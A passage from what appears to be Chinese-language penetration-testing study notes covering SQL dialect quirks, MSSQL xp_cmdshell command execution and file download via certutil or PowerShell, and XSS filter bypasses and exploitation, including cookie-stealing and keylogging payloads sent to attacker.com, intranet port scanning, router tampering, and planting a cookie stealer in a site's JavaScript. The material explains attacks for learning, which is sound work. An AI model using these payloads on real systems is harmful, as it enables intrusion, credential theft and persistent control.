title="不同数据库的查询区别"></a>不同数据库的查询区别</h5><p>每种数据库的查询语法都有一些细微的差别，可以利用这些差异来判断</p><ul><li><p><strong>字符串拼接</strong>：</p></li><li><p><strong>MySQL</strong>：<code>union select &#39;a&#39;,&#39;b&#39;</code></p></li><li><p><strong>SQL Server</strong>：<code>union select &#39;a&#39;+&#39;b&#39;</code></p></li><li><p><strong>Oracle</strong>：<code>union select &#39;a&#39;||&#39;b&#39;</code></p></li><li><p><strong>注释符号</strong>：</p></li><li><p><strong>MySQL&#x2F;PostgreSQL</strong>：<code>--</code> （后面需要加空格）、<code>#</code></p></li><li><p><strong>SQL Server&#x2F;Oracle</strong>：<code>--</code></p></li><li><p><strong>内联注释</strong>：<code>/**/</code> 可以在多种数据库中使用</p></li></ul><h2 id="MySQL-一个-和两个-的区别"><a href="#MySQL-一个-和两个-的区别" class="headerlink" title="MySQL 一个 @ 和两个 @ 的区别"></a>MySQL 一个 @ 和两个 @ 的区别</h2><p><code>@</code><strong>（用户自定义变量）</strong></p><p>一个 <code>@</code> 符号代表<strong>用户自定义变量</strong>（User-Defined Variables）。这种变量是用户在当前会话中手动创建的，它的生命周期只存在于当前 MySQL 连接会话中。当会话结束时，变量也会被释放</p><p><strong>特点：</strong></p><ul><li><p><strong>创建与赋值</strong>：可以使用 <code>SET</code> 或 <code>SELECT ... INTO</code> 语句来赋值</p></li><li><p><code>SET @var_name = value;</code></p></li><li><p><code>SELECT column INTO @var_name FROM table;</code></p></li><li><p><strong>作用域</strong>：仅在当前连接会话中有效。一个用户设置的 <code>@var_name</code> 无法被其他用户连接访问</p></li><li><p><strong>用途</strong>：常用于存储临时数据、在多条 SQL 语句中传递值，或者在存储过程、函数中作为临时变量<br><strong>示例：</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在当前会话中设置一个变量</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@total_price</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用该变量进行计算</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@total_price</span> <span class="operator">*</span> <span class="number">1.1</span> <span class="keyword">AS</span> price_with_tax;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在另一个新的连接中，@total_price 变量是不存在的，它的值为 NULL。</span></span><br></pre></td></tr></table></figure><p><code>@@</code><strong>（系统变量）</strong><br>两个 <code>@</code> 符号代表<strong>系统变量</strong>（System Variables）。这些变量是 MySQL 服务器预先定义好的，用于控制服务器的各种行为和状态<br>系统变量分为两种：</p><ul><li><p><strong>全局系统变量 (</strong><code>@@global.var_name</code><strong>)</strong>：影响 MySQL 服务器的<strong>所有会话</strong>。需要有 <code>SUPER</code> 权限才能修改</p></li><li><p><strong>会话系统变量 (</strong><code>@@session.var_name</code> <strong>或</strong> <code>@@var_name</code><strong>)</strong>：仅影响<strong>当前连接会话</strong>。它的值会继承自全局变量，但可以在会话中被单独修改，且不会影响其他会话</p></li></ul><p><strong>特点：</strong></p><ul><li><p><strong>查看</strong>：可以使用 <code>SHOW VARIABLES</code> 或 <code>SELECT @@var_name</code> 来查看</p></li><li><p><strong>修改</strong>：使用 <code>SET</code> 语句进行修改</p></li><li><p><code>SET GLOBAL max_connections = 200;</code></p></li><li><p><code>SET SESSION sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code></p></li><li><p><code>SET sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code>（<code>SESSION</code> 是默认的）</p></li><li><p><strong>用途</strong>：管理和调整数据库的各种配置，如最大连接数、字符集、缓冲区大小、SQL 模式等</p></li></ul><p><strong>示例：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看当前会话的字符集</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character_set_client</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看全局最大连接数</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.max_connections;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在当前会话中改变 SQL 模式，不影响其他会话</span></span><br><span class="line"><span class="keyword">SET</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在所有会话中改变 SQL 模式 (需要 SUPER 权限)</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;STRICT_TRANS_TABLES&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>特性</th><th>@ (用户变量)</th><th>@@ (系统变量)</th></tr></thead><tbody><tr><td>全称</td><td>User-Defined Variable</td><td>System Variable</td></tr><tr><td>创建者</td><td>用户自定义</td><td>MySQL 服务器预定义</td></tr><tr><td>作用域</td><td>仅当前会话</td><td>全局或当前会话</td></tr><tr><td>主要用途</td><td>存储临时数据，方便在多条 SQL 中传递</td><td>管理和配置服务器行为</td></tr><tr><td>生命周期</td><td>会话结束即失效</td><td>随服务器启动而加载</td></tr><tr><td>可否修改</td><td>用户随时可改</td><td>全局需要 SUPER 权限，会话可自由修改</td></tr></tbody></table><h2 id="为什么MySQL存储过程可以执行命令"><a href="#为什么MySQL存储过程可以执行命令" class="headerlink" title="为什么MySQL存储过程可以执行命令"></a>为什么MySQL存储过程可以执行命令</h2><p><strong>1.</strong> <code>xp_cmdshell</code> <strong>存储过程</strong><br>这是 MySQL 中最著名，也是最危险的命令执行功能</p><p><strong>原理</strong><br><code>xp_cmdshell</code> 是一个扩展存储过程（e<strong>x</strong>tended <strong>p</strong>rocedure）。它允许你在 SQL Server 内部执行操作系统的 <code>cmd.exe</code> 命令<br>当你执行 <code>EXEC xp_cmdshell &#39;dir c:\&#39;</code> 时，SQL Server 会：</p><ol><li><p>启动一个 <code>cmd.exe</code> 进程</p></li><li><p>将你的命令作为参数传递给 <code>cmd.exe</code></p></li><li><p>将命令的输出结果以行的形式返回到 SQL Server 的结果集中</p></li></ol><p><strong>使用条件</strong></p><p>默认情况下，从 SQL Server 2005 开始，<code>xp_cmdshell</code> 处于<strong>禁用状态</strong>。要成功利用它，需要满足以下两个条件：</p><ul><li><p><strong>权限</strong>：你必须拥有 <code>sysadmin</code> 服务器角色或**<code>CONTROL SERVER</code>**权限，这是因为 <code>xp_cmdshell</code> 默认只授予这些高权限用户</p></li><li><p><strong>启用配置</strong>：<code>xp_cmdshell</code> 必须通过以下 SQL 命令手动启用：</p></li></ul><p>`&#96;&#96;sql   sp_configure ‘show advanced options’, 1;   RECONFIGURE;   sp_configure ‘xp_cmdshell’, 1;   RECONFIGURE;   &#96;&#96;&#96;</p><p>在渗透测试中，如果成功通过 SQL 注入或其他方式获得了高权限，你就可以执行这些命令来启用 <code>xp_cmdshell</code>，然后执行任意系统命令</p><p><strong>2. 其他相关的危险存储过程</strong><br>除了 <code>xp_cmdshell</code>，MSSQL 还有其他一些可以执行命令或辅助命令执行的存储过程，但它们不像 <code>xp_cmdshell</code> 那样直接<br><code>sp_addextendedproc</code></p><ul><li><p><strong>原理</strong>：这个存储过程允许你将一个外部 DLL 文件注册为 SQL Server 的扩展存储过程</p></li><li><p><strong>用途</strong>：如果攻击者能上传一个恶意的 DLL 文件到服务器，就可以利用 <code>sp_addextendedproc</code> 将其注册为一个新的扩展存储过程，然后通过执行这个过程来执行恶意代码，从而绕过 <code>xp_cmdshell</code> 的禁用限制</p></li></ul><p><strong>CLR 集成（SQL CLR）</strong></p><ul><li><p><strong>原理</strong>：SQL Server 允许你使用 .NET 语言（如 C#）编写存储过程、函数、触发器等。这些代码可以调用 .NET 框架中的类库，包括那些可以执行系统命令的类，如 <code>System.Diagnostics.Process</code></p></li><li><p><strong>用途</strong>：攻击者可以编写一个恶意的 C# 代码，将其编译成 DLL，然后加载到 SQL Server 中。这是一种更隐蔽、更强大的命令执行方法，因为它不依赖于 <code>xp_cmdshell</code></p></li></ul><h2 id="如果想要通过MySQL上传文件需要开启那个存储过程的权限"><a href="#如果想要通过MySQL上传文件需要开启那个存储过程的权限" class="headerlink" title="如果想要通过MySQL上传文件需要开启那个存储过程的权限"></a>如果想要通过MySQL上传文件需要开启那个存储过程的权限</h2><p><strong>1. 利用</strong> <code>xp_cmdshell</code> <strong>存储过程（最常见）</strong></p><p>如前面所述，<code>xp_cmdshell</code> 是执行系统命令的利器。一旦你获得了执行 <code>xp_cmdshell</code> 的权限（通常是 <code>sysadmin</code>），就可以通过它来执行命令行下的文件上传操作</p><ul><li><p><strong>所需权限</strong>：<code>sysadmin</code> 服务器角色或 <code>CONTROL SERVER</code> 权限，并且 <code>xp_cmdshell</code> 必须已启用</p></li><li><p><strong>实现方法</strong>：</p></li><li><p><strong>方法一：利用</strong> <code>certutil</code> <strong>下载文件</strong> 这是最常见且非常实用的方法，它利用 Windows 自带的 <code>certutil.exe</code> 工具来下载文件</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;certutil.exe -urlcache -split -f &quot;http://&lt;攻击机IP&gt;/&lt;文件名&gt;&quot; &quot;c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这种方法的好处是，<code>certutil</code> 是 Windows 系统自带的，不容易被杀毒软件拦截</p><ul><li><strong>方法二：利用 PowerShell 下载文件</strong> 使用 PowerShell 的 <code>Invoke-WebRequest</code> 或 <code>Net.WebClient</code> 方法来下载文件</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;Invoke-WebRequest -Uri http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>或者使用更简单的别名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;iwr http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>方法三：利用其他命令行工具</strong> 如果目标机器上安装了 <code>wget</code>、<code>curl</code> 等工具，你也可以使用它们</li></ul><p><strong>2. 利用数据库的</strong> <code>OPENROWSET</code> <strong>或</strong> <code>BULK INSERT</code><br>这种方法相对不那么常见，但如果 <code>xp_cmdshell</code> 被禁用，这是一种可以尝试的备选方案。它主要利用 MSSQL 强大的文件处理能力</p><ul><li><p><strong>所需权限</strong>：</p></li><li><p><code>sysadmin</code> 或 <code>bulkadmin</code> 角色</p></li><li><p><code>BULK INSERT</code> 需要对目标文件夹有写权限，并且 <code>OPENROWSET</code> 必须启用 <code>Ad Hoc Distributed Queries</code></p></li><li><p><strong>实现方法</strong>：</p></li><li><p><strong>方法一：</strong><code>OPENROWSET</code> 这种方法可以从一个共享网络路径（UNC Path）读取数据，并插入到数据库表中。虽然它主要用于数据导入，但你可以利用它将文件内容导入到数据库，再通过其他方式导出</p></li><li><p><strong>方法二：</strong><code>BULK INSERT</code> 和 <code>OPENROWSET</code> 类似，<code>BULK INSERT</code> 也能从网络共享路径读取文件数据</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BULK <span class="keyword">INSERT</span> MyTable   <span class="keyword">FROM</span> <span class="string">&#x27;\\&lt;攻击机IP&gt;\share\&lt;文件名&gt;&#x27;</span>   <span class="keyword">WITH</span> (   ROWTERMINATOR <span class="operator">=</span> <span class="string">&#x27;EOF&#x27;</span>,   DATA_SOURCE <span class="operator">=</span> <span class="string">&#x27;MyDataSource&#x27;</span>   );</span><br></pre></td></tr></table></figure><p>这种方法需要 MSSQL 服务的运行用户对网络共享路径有读取权限</p><p><strong>3. 利用 SQL CLR 集成</strong><br>这是一种高级且隐蔽的上传文件方法。如果你能够执行 SQL CLR 代码，你就可以编写一个 .NET 存储过程，该存储过程包含文件读写功能</p><ul><li><p><strong>所需权限</strong>：<code>sysadmin</code> 或 <code>EXTERNAL ACCESS ASSEMBLY</code> 权限</p></li><li><p><strong>实现方法</strong>：</p></li><li><p>用 C# 编写一个可以从 URL 下载文件并保存到本地的 DLL</p></li><li><p>将 DLL 文件上传到服务器，或者通过 <code>xp_cmdshell</code> 下载</p></li><li><p>使用 SQL 命令将 DLL 注册为 SQL CLR 程序集</p></li><li><p>执行你编写的存储过程，实现文件上传</p></li></ul><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>白名单<br>对url实体进行编码<br>CSP</p><h2 id="绕过手法-1"><a href="#绕过手法-1" class="headerlink" title="绕过手法"></a>绕过手法</h2><p><strong>大小写混淆绕过</strong><br><strong>空白字符，换行符号和tab绕过</strong><br><strong>编码绕过，url编码</strong><br><strong>标签和属性嵌套绕过</strong><br>有些过滤器可能只过滤顶层的脚本标签，但忽略嵌套的标签，属性名或属性值之间插入空格，换行符(%0a或%0d)或者Tab键（%09）来绕过<br>例如:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">可以写成,加空格</span><br><span class="line">&lt;img src=<span class="string">&quot; javascript:alert(1);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">可以写成</span><br><span class="line">&lt;script%0a&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>事件处理器绕过</strong><br>除了最常见的onload和onerror事件，还有很多事件可以触发脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onclick</span><br><span class="line">onfocus</span><br><span class="line">onblur</span><br><span class="line">onchange</span><br></pre></td></tr></table></figure><p><strong>使用特殊字符绕过</strong><br>一些特殊字符，如反引号,反斜杠,在JavaScript的反引号可以用来包裹字符串并执行代码</p><h2 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h2><h4 id="窃取cookie和session"><a href="#窃取cookie和session" class="headerlink" title="窃取cookie和session"></a><strong>窃取cookie和session</strong></h4><p>像留言条，评论区都容易产生xss<br>如果是存储型且无审核，可造成大面积窃取登录信息cookie<br>构成盗号等风险</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://attacker.com/cookie_stealer.php?c=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a><strong>键盘记录</strong></h4><p>植入键盘记录器捕获当前页面键盘记录，包括用户名，密码，信息，信用卡号密码，这种方法毫无察觉</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="comment">// 将用户按键信息发送到攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/keylogger.php?key=&#x27;</span> + e.<span class="property">key</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a><strong>钓鱼攻击</strong></h4><p>通过xss，攻击者可以篡改网页内容，插入虚假的登陆框或提示信息，诱骗用户输入账号和密码，例如在合法的页面弹出一个伪造的登录框，提示用户“你的会话已过期，请重新登录”，用户以为是正常操作，输入这些用户信息，这些信息就会发送到攻击者的服务器上</p><h4 id="网页挂马和恶意重定向"><a href="#网页挂马和恶意重定向" class="headerlink" title="网页挂马和恶意重定向"></a><strong>网页挂马和恶意重定向</strong></h4><p>利用xss重定向到恶意网站，或者在当前页面加载而已脚本，例如加密勒索病毒</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://malicious-site.com&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>或者加载恶意脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://malicious-site.com/malware.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过同源策略"><a href="#绕过同源策略" class="headerlink" title="绕过同源策略"></a><strong>绕过同源策略</strong></h4><p>虽然浏览器的同源策略限制了不同源的脚本互相访问，但在某些特定情况下，XSS 可以作为绕过同源策略的第一步。一旦在目标域上执行了脚本，攻击者就可以访问该域下的敏感数据，比如通过 AJAX 请求获取用户的私人信息</p><h4 id="盗用-CSRF-Token"><a href="#盗用-CSRF-Token" class="headerlink" title="盗用 CSRF Token"></a><strong>盗用 CSRF Token</strong></h4><p>许多网站使用 CSRF Token 来防御跨站请求伪造攻击。但如果存在 XSS 漏洞，攻击者可以轻松地通过 JavaScript 获取页面中的 CSRF Token，然后构造一个合法的请求（例如，转账请求），并代表用户提交</p><p>恶意代码示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 通过 AJAX 请求获取页面内容</span></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/user/profile&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 从 HTML 中解析 CSRF Token，并构造一个请求</span></span><br><span class="line">    <span class="keyword">const</span> csrfToken = html.<span class="title function_">match</span>(<span class="regexp">/csrf-token&quot; content=&quot;(.*?)&quot;&gt;/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/transfer&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="string">`amount=1000&amp;to=attacker&amp;_csrf=<span class="subst">$&#123;csrfToken&#125;</span>`</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="DOM篡改"><a href="#DOM篡改" class="headerlink" title="DOM篡改"></a>DOM篡改</h4><p>攻击者可以修改页面上的 DOM 元素，例如，隐藏或替换页面上的某些内容，或者插入广告、恶意链接等</p><h2 id="xss怎么打内网"><a href="#xss怎么打内网" class="headerlink" title="xss怎么打内网"></a>xss怎么打内网</h2><p><strong>扫端口</strong><br>最基础也最常见的利用方式。攻击者可以通过 JavaScript 构造请求（如 <code>&lt;img&gt;</code> 或 <code>&lt;iframe&gt;</code> 标签），尝试加载内网 IP 地址和端口，并根据加载成功或失败来判断端口是否开放<br><strong>基本思路：</strong></p><ul><li><strong>加载</strong> <code>&lt;img&gt;</code> <strong>标签</strong>： <code>&lt;img&gt;</code> 标签的 <code>src</code> 属性可以指向内网 IP 和端口。如果图片能够加载成功，就说明该端口是开放的。可以通过 <code>onerror</code> 和 <code>onload</code> 事件来判断加载结果</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;  </span><br><span class="line"><span class="keyword">const</span> targetPorts = [<span class="number">80</span>, <span class="number">22</span>, <span class="number">445</span>, <span class="number">8080</span>];</span><br><span class="line"></span><br><span class="line">targetPorts.<span class="title function_">forEach</span>(<span class="function"><span class="params">port</span> =&gt;</span> &#123;  </span><br><span class="line"><span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();  </span><br><span class="line">img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;  </span><br><span class="line"><span class="comment">// 端口开放  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is open.`</span>);  </span><br><span class="line"><span class="comment">// 将结果发送回攻击者服务器  </span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?ip=<span class="subst">$&#123;targetIp&#125;</span>&amp;port=<span class="subst">$&#123;port&#125;</span>&amp;status=open`</span>);  </span><br><span class="line">&#125;;  </span><br><span class="line">img.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;  </span><br><span class="line"><span class="comment">// 端口关闭或无法访问  </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Port <span class="subst">$&#123;port&#125;</span> on <span class="subst">$&#123;targetIp&#125;</span> is closed.`</span>);  </span><br><span class="line">&#125;;  </span><br><span class="line">img.<span class="property">src</span> = <span class="string">`http://<span class="subst">$&#123;targetIp&#125;</span>:<span class="subst">$&#123;port&#125;</span>`</span>;  </span><br><span class="line">&#125;);  </span><br></pre></td></tr></table></figure><ul><li><strong>加载</strong> <code>&lt;iframe&gt;</code> <strong>标签</strong>： <code>&lt;iframe&gt;</code> 标签可以用来加载内网页面。如果加载成功，攻击者可以通过 JavaScript 获取页面的部分内容（但受同源策略限制）</li></ul><p><strong>服务指纹识别</strong><br>通过端口扫描后，可以确定内网中有哪些服务是开放的。接下来，可以通过 JavaScript 发送 AJAX 请求到这些服务，然后根据响应头（如 <code>Server</code>、<code>X-Powered-By</code>）或页面内容来识别服务的类型和版本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> targetUrl = <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(targetUrl)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 检查响应头，获取服务信息</span></span><br><span class="line">    <span class="keyword">const</span> serverHeader = response.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Server&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server on <span class="subst">$&#123;targetUrl&#125;</span> is: <span class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// 将结果发送回攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`http://attacker.com/log?url=<span class="subst">$&#123;targetUrl&#125;</span>&amp;server=<span class="subst">$&#123;serverHeader&#125;</span>`</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Could not connect to <span class="subst">$&#123;targetUrl&#125;</span>`</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>攻击内网路由器或管理后台</strong><br>许多内网路由器和管理系统都存在默认密码或已知漏洞。攻击者可以利用 XSS 漏洞，在受害者浏览器中构造并发送针对这些设备的请求</p><p><strong>示例：利用 CSRF 漏洞修改路由器密码</strong><br>假设某个路由器修改密码的请求是：<code>POST /admin/password_change</code>，并带上参数 <code>new_password=123456</code>。 攻击者可以通过 JavaScript 构造一个表单并提交，或者直接用 <code>fetch</code> 发送请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设路由器IP是 192.168.1.1，并且修改密码的路径是 /admin/change_password</span></span><br><span class="line"><span class="keyword">const</span> routerIp = <span class="string">&#x27;192.168.1.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> newPassword = <span class="string">&#x27;hacked_by_xss&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;password&#x27;</span>, newPassword);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">`http://<span class="subst">$&#123;routerIp&#125;</span>/admin/change_password`</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: formData</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Router password changed!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>HttpOnly。当一个网站允许TRACE亲求是间，可以按照下面的步骤攻击</p><p>1.构造一个恶意链接或访问一个恶意脚本の页面<br>2.恶意脚本向受害者的浏览器发一个TRACE请求<br>3.如果服务器没有正确的配置。他可能会在trace响应中包含所有HTTP请求头，包括带有httponly标志的cookie<br>4.恶意脚本通过js读取trace的内容，从而获取到cookie</p><p>防御：禁用HTTP的trace和track方法，现在的服务器默认禁用了这些方法</p><h2 id="有shell的情况怎么xss实现对目标长久控制"><a href="#有shell的情况怎么xss实现对目标长久控制" class="headerlink" title="有shell的情况怎么xss实现对目标长久控制"></a>有shell的情况怎么xss实现对目标长久控制</h2><h3 id="xss劫持管理员会话"><a href="#xss劫持管理员会话" class="headerlink" title="xss劫持管理员会话"></a>xss劫持管理员会话</h3><p>这是最直接的xss<br>当管理员访问xss漏洞的页面，我们的恶意js代码会执行，并窃取管理员的cookie，sessionStorage，localStorage等会话信息</p><p><strong>实现</strong><br><strong>webshell注入</strong><br>在你获取的shell页面找一个管理员经常访问的，可写入的文件，例如网站的公共js文件，后台管理页面模板等</p><p><strong>插入payload</strong><br>在改文件插入恶意js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://your-evil-server.com/log.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><p><strong>获取会话</strong><br>当管理员访问该页面时，他们的 <code>cookie</code> 就会被发送到您的服务器 <code>log.php</code>。您可以用这些 <code>cookie</code> 